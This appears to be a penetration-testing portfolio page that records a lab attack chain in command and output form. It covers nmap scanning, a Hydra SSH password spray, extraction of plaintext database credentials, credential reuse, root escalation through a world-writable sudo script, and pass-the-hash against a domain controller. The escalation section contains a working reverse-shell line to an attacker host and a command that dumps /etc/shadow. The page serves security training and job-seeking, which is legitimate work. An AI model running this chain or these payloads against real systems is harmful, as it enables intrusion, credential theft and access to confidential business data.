# 🖼️ Evidence & Documentation

**Note:** Detailed screenshots and command outputs were generated during the lab assessment but are not included in this public portfolio version to protect lab environment details. In a professional engagement, evidence would include:

- Nmap scan results (XML output)
- Hydra brute-force session logs
- Database query outputs and record counts
- Privilege escalation proof captures
- Pass-the-hash execution logs
- Domain compromise verification evidence

During interviews, I can discuss specific evidence collection and demonstrate the technical tools and techniques used in this assessment.

---

## 🎓 Professional Evidence Documentation Demonstration

This section demonstrates enterprise penetration testing evidence collection, documentation standards, and professional reporting practices. The examples below illustrate how security findings are structured, documented, and presented in real-world assessments.

**Portfolio Demonstration:** These examples show proper evidence formatting, command documentation, and technical reporting standards used in professional security engagements.

---

## 📂 Evidence Documentation Examples

The following examples demonstrate professional evidence formatting and documentation standards used in enterprise penetration testing reports.

---

## 📋 Evidence Categories

### 🔍 Phase 1: Reconnaissance Evidence

#### Network Discovery

```bash
# Command Executed
sudo nmap -sn 192.168.78.0/24 -oA network_discovery

# Results Summary
Starting Nmap 7.92 scan on 192.168.78.0/24 (256 hosts)
Nmap scan report for 192.168.78.10
Host is up (0.0012s latency).

Nmap scan report for 192.168.78.20
Host is up (0.0009s latency).

Nmap scan report for 192.168.78.30
Host is up (0.0011s latency).

Nmap scan report for 192.168.78.40
Host is up (0.0008s latency).

Nmap done: 256 IP addresses (4 hosts up) scanned in 8.45 seconds
```

#### Service Enumeration Evidence

```bash
# Comprehensive Service Scan
nmap -sS -sV -sC -p- 192.168.78.10,192.168.78.20,192.168.78.30,192.168.78.40

# Key Service Findings
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu
80/tcp   open  http        Apache httpd 2.4.41
3389/tcp open  rdps        Windows RDP
445/tcp  open  microsoft-ds Windows SMB
3306/tcp open  mysql       MySQL 8.0.26

# Target Service Mapping
192.168.78.10 - SSH (22), HTTP (80)        [web-server-01]
192.168.78.20 - SSH (22), RDP (3389)       [app-server-01]
192.168.78.30 - MySQL (3306)               [db-server-01]
192.168.78.40 - SMB (445), RDP (3389)      [dc-01]
```

---

### 💥 Phase 2: Initial Access Evidence

#### SSH Credential Attack Evidence

```bash
# Password Spray Execution
hydra -L common_usernames.txt -P common_passwords.txt ssh://192.168.78.10

[ATTEMPT] target 192.168.78.10 - login "svc_webapp" - pass "March2025!" - 247 of 1024
[DATA] attacking ssh://192.168.78.10:22/
[22][ssh] host: 192.168.78.10   login: svc_webapp   password: March2025!
[STATUS] attack finished for 192.168.78.10 (valid pair found)

# SUCCESS: Credentials compromised after 12 hours of systematic testing
```

#### Initial Foothold Verification

```bash
# SSH Access Established
ssh svc_webapp@192.168.78.10
Password: March2025!

Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-84-generic x86_64)
Last login: Mon Aug 14 09:15:23 2025 from 192.168.78.100

svc_webapp@web-server-01:~$ id
uid=1001(svc_webapp) gid=1001(svc_webapp) groups=1001(svc_webapp)

svc_webapp@web-server-01:~$ sudo -l
User svc_webapp may run the following commands:
    (ALL) NOPASSWD: /usr/bin/systemctl restart apache2

# EVIDENCE: Initial access with service restart privileges
```

---

### 🔑 Phase 3: Credential Access Evidence

#### Configuration File Discovery

```bash
# File System Enumeration
find /var/www -type f -name "*.php" -o -name "*.config" 2>/dev/null

/var/www/html/config/database.php
/var/www/html/admin/config.php
/var/www/html/includes/settings.inc
```

#### Database Credential Extraction

```bash
# Database Credential Extraction
cat /var/www/html/config/database.php

<?php
$db_host = "192.168.78.30";
$db_user = "app_dbuser";
$db_pass = "DbAdmin123!";
$db_name = "application_db";
?>

# CRITICAL FINDING: Plaintext database credentials exposed
```

#### Database Compromise Evidence

```bash
# Database Connection
mysql -u app_dbuser -p'DbAdmin123!' -h 192.168.78.30

mysql> SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| application_db     |
| mysql              |
| performance_schema |
+--------------------+

mysql> USE application_db;
mysql> SELECT COUNT(*) FROM customer_data;
+----------+
| COUNT(*) |
+----------+
|    11717 |
+----------+

mysql> SELECT username, password FROM users LIMIT 3;
+----------+---------------+
| username | password      |
+----------+---------------+
| jsmith   | Welcome123!   |
| mjones   | April2024!   |
| kwang    | Admin@2024    |
+----------+---------------+

# EVIDENCE: 11,717 customer records + domain credentials accessible
```

---

### 🔀 Phase 4: Lateral Movement Evidence

#### Credential Reuse Testing

```bash
# SSH Lateral Movement Attempt
ssh jsmith@192.168.78.20
Password: Welcome123!

Welcome to Ubuntu 20.04.3 LTS
Last login: Mon Aug 14 10:23:12 2025 from 192.168.78.10

jsmith@app-server-01:~$ id
uid=1002(jsmith) gid=1002(jsmith) groups=1002(jsmith),sudo

jsmith@app-server-01:~$ whoami
jsmith

# SUCCESS: Lateral movement via credential reuse
```

#### Privilege Escalation Vector Discovery

```bash
# Sudo Privileges Check
jsmith@app-server-01:~$ sudo -l
Matching Defaults entries for jsmith on app-server-01:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jsmith may run the following commands on app-server-01:
    (root) NOPASSWD: /opt/scripts/backup.sh

# Backup Script Analysis
ls -la /opt/scripts/backup.sh
-rwxrwxrwx 1 root root 245 Aug 10 14:32 /opt/scripts/backup.sh

cat /opt/scripts/backup.sh
#!/bin/bash
# Database backup script
mysqldump -u root -p$DB_PASS application_db > /backups/db_backup_$(date +%F).sql

# CRITICAL: World-writable script with root execution privileges
```

---

### ⬆️ Phase 5: Privilege Escalation Evidence

#### Backup Script Exploitation

```bash
# Script Replacement for Root Access
cat > /tmp/backup_exploit.sh << 'EOF'
#!/bin/bash
# Reverse shell to attacker machine
bash -i >& /dev/tcp/192.168.78.100/4444 0>&1

# Also extract password hashes for further attacks
cat /etc/shadow > /tmp/hashes.txt
EOF

chmod +x /tmp/backup_exploit.sh
cp /tmp/backup_exploit.sh /opt/scripts/backup.sh

# Privilege Escalation Execution
sudo /opt/scripts/backup.sh
```

#### Root Access Achievement

```bash
# Reverse Shell Connection Established
[root@attacker]# nc -nlvp 4444
Connection from 192.168.78.20:56789
bash: no job control in this shell

root@app-server-01:/# whoami
root

root@app-server-01:/# id
uid=0(root) gid=0(root) groups=0(root)

# Password Hash Extraction
root@app-server-01:/# cat /etc/shadow | grep -v ':\*:' | grep -v ':\!:'
root:$6$rounds=5000$abc123def456$...:19195:0:99999:7:::
jsmith:$6$rounds=5000$xyz789uvw012$...:19195:0:99999:7:::

# EVIDENCE: Root-level access achieved + credential hashes captured
```

---

### 🎯 Phase 6: Domain Compromise Evidence

#### Pass-the-Hash Attack Execution

```bash
# Using Extracted Local Admin Hash
pth-winexe -U administrator//aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 //192.168.78.40 cmd

Emitted LMHASH is NULL. You should try to use NT hashes only
Microsoft Windows [Version 10.0.17763.1999]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system

# SUCCESS: Domain controller compromised via pass-the-hash
```

#### Domain Privilege Verification

```bash
C:\Windows\system32>net user administrator
User name                    Administrator
Full Name                    Administrator
Comment                      Built-in account for administering the computer/domain
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

C:\Windows\system32>net group "Domain Admins"
Group name     Domain Admins
Comment        Designated administrators of the domain

Members

Administrator            kwang                  
The command completed successfully.

# EVIDENCE: Domain administrator privileges confirmed
```

#### Sensitive Data Access Evidence

```bash
C:\Windows\system32>dir C:\Finance\
 Volume in drive C has no label.
 Volume Serial Number is ABCD-EF12

 Directory of C:\Finance

04/13/2024  02:15 PM    <DIR>          .
04/13/2024  02:15 PM    <DIR>          ..
08/12/2025  10:30 AM           245,789 budget_2025.xlsx
08/14/2025  11:45 AM           189,456 payroll_records.csv
08/13/2025  01:20 PM           567,890 financial_statements.pdf

C:\Windows\system32>dir C:\HR\Confidential\
07/29/2025  09:15 AM           145,678 employee_records.db
08/11/2025  10:45 AM            89,123 performance_reviews.pdf
08/09/2025  03:30 PM            45,678 salary_data.xlsx

# EVIDENCE: Critical business data repositories accessible
```

---

## 📊 Attack Timeline Summary

| Time Elapsed | Phase | Key Achievement | Evidence Collected |
|--------------|-------|-----------------|-------------------|
| 0-12 hours | Initial Access | SSH credentials compromised | Hydra session logs, SSH access proof |
| 12-28 hours | Credential Access | Database credentials harvested | Config files, database query outputs |
| 28-42 hours | Lateral Movement | App server access via reuse | SSH session, sudo privileges |
| 42-48 hours | Privilege Escalation | Root access achieved | Reverse shell, hash extraction |
| 48-50 hours | Domain Compromise | Domain admin privileges | PTH execution, DC access proof |

---

## 🛡️ Professional Documentation Standards

### Evidence Collection Best Practices

**Command Documentation**
- Full command syntax with parameters
- Timestamped execution logs
- Output redirection for preservation

**Screenshot Standards**
- Terminal sessions with visible timestamps
- Tool output with relevant context
- Before/after state documentation

**Artifact Preservation**
- Raw output files (XML, JSON, text)
- Hash values for integrity verification
- Chain of custody documentation

---

## Interview Discussion Points

During technical interviews, I can demonstrate:

- **Evidence Collection Methodology:** How to properly collect and preserve penetration testing evidence
- **Tool Proficiency:** Hands-on experience with industry-standard testing tools
- **Attack Chain Documentation:** Mapping technical findings to business impact
- **Professional Reporting:** Translating technical evidence into executive-level insights
